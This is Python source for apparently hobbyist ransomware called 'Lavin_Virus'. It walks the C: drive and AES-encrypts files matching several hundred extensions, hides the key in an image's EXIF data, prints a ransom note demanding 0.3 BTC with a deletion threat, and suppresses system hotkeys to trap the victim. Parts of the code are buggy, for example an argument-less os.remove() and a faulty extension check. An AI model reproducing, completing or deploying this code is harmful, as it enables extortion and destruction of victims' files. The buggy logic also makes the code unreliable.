import multiprocessing
import os
from time import sleep
import keyboard
import numpy as np
from multiprocessing import Pool 
import pyAesCrypt
from stegano import exifHeader
import ctypes
import functools

from lavin import Decrypt
kernel32 = ctypes.windll.kernel32
kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)

part_one = ['113', '1cd', '3dm', '3ds', '3fr', '3g2', '3gp', '3pr', '73b',
    '7z', 'a3d', 'ab4', 'abf', 'abk', 'ac2', 'accdb', 'accde', 'accdr', 'accdt',
  'acr', 'adb', 'aep', 'agd1', 'ach', 'ai', 'ait', 'al', 'apj', 'apk', 'ark',
  'arw', 'as4', 'asf', 'asm', 'asp', 'asset', 'asvx', 'asx', 'ate', 'ati',
  'avi', 'awg', 'azw', 'azw4', 'b1', 'bac', 'back', 'backup', 'backupdb', 'bak',
  'bakx', 'bar', 'bay', 'bb', 'bc6', 'bc7', 'bck', 'bcm', 'bdb', 'bgt', 'big', 'bik',
  ]
part_two = ['dotm', 'dotx', 'drf', 'drw', 'dt', 'dta', 'dtaus', 'dtd', 'dwfx', 'dwg', 'dxb', 'dxf', 'dxg',
  'edi', 'eml', 'emlx', 'epk', 'eps', 'epub', 'erbsql', 'erf', 'esm', 'exf', 'fb2', 'fbf', 'fbk', 'fbw', 'fbx',
  'fdb', 'ffd', 'fff', 'fh', 'fhd', 'fla', 'flac', 'flv', 'forge', 'fos', 'fpk', 'fpx', 'fsh', 'fxg', 
  'gbk', 'gdb', 'gho', 'gif', 'gpx', 'gray', 'grey', 'gros', 'gry', 'h', 'hbk', 'hkdb', 'hkx', 'hplg', 
  'hpp', 'htm', 'html', 'hvpl', 'hxi', 'hxq', 'hxr', 'hxs', 'hxw', 'chi', 'chm', 'chq', 'chw', 'ibank', 
  ]
part_three= ['nef', 'netcdf', 'nk2', 'nop', 'nrw', 'ns2', 'ns3', 'ns4', 'nsd', 'nsf', 'nsg', 'nsh', 'ntl', 'nwb', 'nx1', 'nx2', 'nyf', 'oab', 'obj', 'odb', 
  'odc', 'odf', 'odg', 'odm', 'odp', 'ods', 'odt', 'orf', 'ost', 'otg', 'oth', 'otp', 'ots', 'ott', 
  'p12', 'p7b', 'p7c', 'pab', 'pak', 'pas', 'pat', 'pcd', 'pct', 'pdb', 'pdb', 'pdd', 'pdf', 'pef', 'pem', 'pfx', 'php', 'pkpass', 'pl', 'png', 'pot', 
  'potm', 'potx', 'ppam', 'pps', 'ppsm', 'ppsx', 'ppt', 'pptm', 'pptx', 'prf', 'prproj', 'ps', 
  'psafe3', 'psd', 'psk', 'pst', 'ptx', 'pub', 'pwm', 'py', 'pz3', 'qba', 'qbb', 'qbm', 'qbo', 'qbr', 'qbw', 'qbx', 'qby', 
  'qdf', 'qfx', 'qic', 'qif', 'qt', 'qvw', 's3db', 'sav', 'sb', 'sbs', 'sd0', 'sd1', 'sda', 'sdf', 'sdxf', 
  'shtm', 'shtml', 'sid', 'sidd', 'sidn', 'sie', 'sis', 'sldasm', 'sldm', 'sldprt', 'sldx', 'slm', 'sln', 
  ]
part_four = ['bkf', 'bkp', 'blend', 'blob', 'bpw', 'bsa', 'c', 'cab', 'cas', 'cb7', 'cbr',
  'cbt', 'ccd', 'cdf', 'cdr', 'cdr3', 'cdr4', 'cdr5', 'cdr6', 'cdrw', 'cdx', 'ce1', 'ce2',
  'cer', 'cf', 'cfp', 'cfr', 'cgm', 'cib', 'cls', 'cmt', 'con', 'cpi', 'cpp', 'cpt', 'cr2',
  'craw', 'crt', 'crw', 'cs', 'csh', 'csl', 'css', 'csv', 'ctb', 'd3dbsp', 'dac', 'das', 'dat', 
  'data', 'db', 'db0', 'db3', 'dba', 'dbf', 'dc2', 'dc3', 'dcr', 'dcs', 'ddrw', 'dds', 'der', 
  'des', 'desc', 'design', 'dgb', 'dgc', 'dicom', 'divx', 'djvu', 'dmg', 'dmp', 'dng', 'doc', 'docm', 
  'docx', 'dot']
part_five= ['ibd', 'ibz', 'icxs', 'idx', 'iff', 'img', 'inc', 'incpas', 'iso', 'itdb', 'itl', 'itm', 'iv2i', 'iwd', 
  'iwi', 'jar', 'java', 'jpe', 'jpeg', 'jpg', 'js', 'kc2', 'kdb', 'kdbx', 'kdc', 'key', 'keystore', 'keystore', 
  'kf', 'kpdx', 'layout', 'lbf', 'ldf', 'lic', 'lit', 'litemod', 'lrf', 'ltx', 'lua', 'lvl', 'm', 'm2', 'm2v', 
  'm3d', 'm3u', 'm4a', 'm4v', 'map', 'max', 'mcmeta', 'mdb', 'mdbackup', 'mdc', 'mddata', 'mdf', 'mds', 'mef', 
  'menu', 'mfw', 'mkv', 'mlx', 'mmw', 'mobi', 'model', 'moneywell', 'mos', 'mov', 'mp3', 'mp4', 'mpeg-1', 'mpeg-2', 
  'mpeg-4', 'mpg',  'mpq', 'mpqge', 'mrw', 'mrwref', 'msg', 'myd', 'nbd', 'ncf', 'nd', 'ndd']
part_six = ['sn1', 'sna', 'snx', 'spf', 'sql', 'sqlite', 'sqlite3', 'sqlitedb', 'sr2', 'srf', 'srt', 'srw', 'st4', 'st5', 
  'st6', 'st7', 'st8', 'stc', 'std', 'sti', 'stw', 'stx', 'sub', 'sum', 'suo', 'svg', 'swf', 'swm', 'sxc', 'sxd', 
  'sxg', 'sxi', 'sxm', 'sxw', 't12', 't13', 'tar', 'tax', 'tbl', 'tex', 'tga', 'tib', 'tis', 'tlg', 'trn', 'txt', 
  'upk', 'vcf', 'vdf', 'vfs0', 'vob', 'vob', 'vpk', 'vpp_pc', 'vtf', 'w3x', 'wab', 'wallet', 'wav', 'wbb', 'wbcat', 
  'wdb', 'wif', 'wim', 'win', 'wma', 'wmo', 'wmv', 'wpd', 'wps', 'x3f', 'xar', 'xf', 'xla', 'xlam', 'xlk', 'xll', 
  'xlm', 'xlr', 'xls', 'xlsb', 'xlsk', 'xlsm', 'xlsx', 'xlt', 'xltm', 'xltx', 'xlw', 'xmi', 'xml', 'ycbcra', 'yuv', 
  'z', 'zip', 'ztmp']


def Encrypt(key, part):
    """
    function for encrypting files
    params = key, part of names
    """
    buff = 512*1024
    np_part = np.array(part, str)
    for addresses, dirs, files in os.walk('C:\\', topdown=True):
      for file in files:
        if file.split('.')[-1] in np_part:
          pyAesCrypt.encryptFile(file, file+'.lol', key, buff)
          try:
            os.remove()
          except Exception:
            pass


def Descrypt(key):
    """
    function for decrypting files after input right key
    """
    buff = 512*1024
    for addresses, dirs, files in os.walk('C:\\', topdown=True):
      for file in files:
        if file.split('.') == 'lol':
          pyAesCrypt.decryptFile(file, file[:-4], key, buff)
          os.remove(file)


if __name__ == '__main__':
    multiprocessing.freeze_support()
    text = """Hello, ur files are encrypted by Lavin_Virus.\n U must pay 0.3BTC for   72616e646f6d77616c6c65745f627463\n and send to example@email.com receipt \n after sending for getting descrypt ur files.\n I forgot, after 3 hours ur files will be delete!!!"""
    print(f'\033[31m {text}')
    res = exifHeader.reveal("WAIIPAPER.jpg").decode()
    enc = functools.partial(Encrypt, res)
    sleep(300.0)
    key = str(input('Input key: '))
    keyboard.add_hotkey("alt + f4", None, suppress=True)
    keyboard.add_hotkey("alt + tab", None, suppress=True)
    keyboard.add_hotkey("win + r", None, suppress=True)
    keyboard.add_hotkey("win + d", None, suppress=True)
    keyboard.add_hotkey("win", None, suppress=True)
    keyboard.add_hotkey("win + g", None, suppress=True)
    keyboard.add_hotkey("ctrl + shift + esc", None, suppress=True)
    keyboard.add_hotkey('ctrl + alt + esc', None)
    with Pool(6) as p:
      p.map(enc, [part_one, part_two, part_three, part_four, part_five, part_six])
    if key == res:
      text = 'THANKS FOR UR OFFERTORY'
      print(f"\033[32m {text}")
      p = multiprocessing.Process(target=Decrypt, args=(key, ))
      p.start()
      p.join()
      try:
        os.remove('lavin.exe')
      except Exception:
        pass